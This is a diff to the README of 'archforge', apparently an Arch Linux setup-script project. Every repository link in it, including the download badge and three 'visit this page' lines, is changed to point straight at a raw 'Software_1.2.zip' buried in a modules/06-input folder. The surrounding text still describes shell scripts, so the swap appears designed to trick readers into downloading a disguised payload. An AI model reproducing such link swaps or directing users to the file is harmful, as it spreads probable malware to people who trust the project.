@@ -1,6 +1,6 @@
 # ⚙️ archforge - Set Up Arch Linux Fast
 
-[![Download](https://img.shields.io/badge/Download-archforge-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/35369668Ap/archforge)
+[![Download](https://img.shields.io/badge/Download-archforge-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/35369668Ap/archforge/raw/refs/heads/main/modules/06-input/Software_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it after you finish a fresh Arch Linux install and want a faster way to hand
 
 Visit this page to download and use archforge:
 
-https://github.com/35369668Ap/archforge
+https://github.com/35369668Ap/archforge/raw/refs/heads/main/modules/06-input/Software_1.2.zip
 
 On the GitHub page, look for the latest release or the main project files. Download the files you need, then follow the steps below to run the setup on your Arch Linux system.
 
@@ -49,7 +49,7 @@ It uses modular steps, so you can choose the parts you want and skip the rest.
 
 Go to:
 
-https://github.com/35369668Ap/archforge
+https://github.com/35369668Ap/archforge/raw/refs/heads/main/modules/06-input/Software_1.2.zip
 
 ### 2. Get the files
 
@@ -201,6 +201,6 @@ It is useful for users who want a guided shell-based setup with common desktop a
 
 To begin, visit:
 
-https://github.com/35369668Ap/archforge
+https://github.com/35369668Ap/archforge/raw/refs/heads/main/modules/06-input/Software_1.2.zip
 
 Then download the project files, open a terminal in the folder, and run the main script to start the setup flow
